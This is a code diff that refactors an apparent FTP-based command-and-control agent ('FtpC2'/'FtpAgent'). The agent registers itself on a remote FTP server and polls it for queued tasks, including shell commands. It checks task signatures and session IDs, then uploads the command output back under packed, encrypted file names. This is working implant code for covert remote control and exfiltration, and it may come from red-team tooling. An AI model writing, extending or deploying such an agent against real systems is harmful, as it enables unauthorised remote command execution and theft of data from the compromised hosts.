@@ -12,82 +12,97 @@
 using FtpC2.Responses;
 using FtpC2.Tasks;
 using System.Text.Json;
+using System.Threading.Tasks;
 
 namespace FtpAgent
 {
     internal class AgentProtocol : ProtocolBase
     {
                 
-        public AgentProtocol(string host, string username, string password, bool secure, Guid agentSession)
-            : base(host, username, password, secure, agentSession)
-        { }
+        public AgentProtocol(string host, string username, string password, bool secure, Guid session)
+            : base(host, username, password, secure)
+        {
+            this.Session = session;
+        }
 
         public void RegisterOrUpdateAgent()
         {
             Agent agent = new();
 
-            agent.Refresh(GetSession());
+            agent.Refresh(this.Session);
 
             string jsonAgent = JsonSerializer.Serialize(agent);
 
-            UploadString(jsonAgent, Shared.PlaceHolders.AgentInformation);
+            string remoteFileName = PackRemoteFileName(
+                Shared.PlaceHolders.AgentInformation,
+                this.Session ?? Guid.Empty,
+                null,
+                PeerEncryptionHelper
+            );
+
+            UploadString(jsonAgent, remoteFileName);
         }
 
         public List<TaskWrapper> EnumerateTasks()
         {
             List<TaskWrapper> tasks = new();
 
-            List<string> files = ListDirectory();
-
-            string taskSessionCandidate = "";
+            List<string> files = ListDirectory();            
 
             foreach (string file in files)
             {
-                if (!file.StartsWith(Shared.PlaceHolders.TaskRequest))
-                    continue;
+                var packedFileName = UnpackRemoteFileName(file);
+                if (packedFileName == null)
+                    continue; // Ignore
 
-                taskSessionCandidate = file.Substring(Shared.PlaceHolders.TaskRequest.Length + 1 /* +1 to ignore the dot */);                
-
-                if (!Guid.TryParse(taskSessionCandidate, out Guid taskSession))
-                    continue;                
-
+                if (packedFileName.Name != Shared.PlaceHolders.TaskRequest)
+                    continue; // Ignore
                 try
                 {
+                    if (!packedFileName.Session.HasValue)
+                        throw new FormatException($"Session GUID expected but not found for file \"{file}\".");
+
+                    if (packedFileName.Session != this.Session)
+                        continue; // Ignore
+
+                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
+                        continue; // Ignore
+
                     // Download task content
                     string jsonData = DownloadString(file);
 
                     TaskWrapper? wrappedTask = JsonSerializer.Deserialize<TaskWrapper>(jsonData);
                     TaskWrapper? task = null;
 
-                    if (wrappedTask != null && wrappedTask.Id == taskSession)
+                    if (wrappedTask == null || wrappedTask.Id != packedFileName.Uid)
+                        throw new FormatException("File is corrupted or invalid.");
+                    
+                    switch(wrappedTask.TaskType)
                     {
-                        switch(wrappedTask.TaskType)
+                        case "TaskShellCommand":
                         {
-                            case "TaskShellCommand":
-                            {
-                                    TaskShellCommand? unwrappedTask = JsonSerializer.Deserialize<TaskShellCommand>(jsonData);
-                                    if (unwrappedTask != null)
-                                        task = unwrappedTask;
+                                TaskShellCommand? unwrappedTask = JsonSerializer.Deserialize<TaskShellCommand>(jsonData);
+                                if (unwrappedTask != null)
+                                    task = unwrappedTask;
 
-                                    break;
-                            }
-
-                            case "TaskCommand":
-                                {
-                                    TaskCommand? unwrappedTask = JsonSerializer.Deserialize<TaskCommand>(jsonData);
-                                    if (unwrappedTask != null)
-                                        task = unwrappedTask;
-
-                                    break;
-                                }
-
-                            // Add your additional task classes here
-                            // ...
+                                break;
                         }
 
-                        if (task != null)
-                            tasks.Add(task);
-                    }                    
+                        case "TaskCommand":
+                            {
+                                TaskCommand? unwrappedTask = JsonSerializer.Deserialize<TaskCommand>(jsonData);
+                                if (unwrappedTask != null)
+                                    task = unwrappedTask;
+
+                                break;
+                            }
+
+                        // Add your additional task classes here
+                        // ...
+                    }
+
+                    if (task != null)
+                        tasks.Add(task);                                      
                 }
                 catch
                 {
@@ -116,13 +131,20 @@ namespace FtpAgent
         public void RegisterNewResponse(ResponseWrapper response, Guid taskId)
         {
             response.TaskId = taskId;
-            response.AgentId = GetSession() ?? Guid.Empty;
+            response.AgentId = this.Session ?? Guid.Empty;
             response.DateTime = DateTime.Now;
             response.ResponseType = response.GetType().Name;
 
             string jsonData = JsonSerializer.Serialize(response, response.GetType());
 
-            UploadString(jsonData, $"{Shared.PlaceHolders.ResponseRequest}.{taskId}");
+            string remoteFileName = PackRemoteFileName(
+                Shared.PlaceHolders.ResponseRequest,
+                this.Session ?? Guid.Empty,
+                taskId,
+                PeerEncryptionHelper
+            );
+
+            UploadString(jsonData, remoteFileName);
         }
 
     }
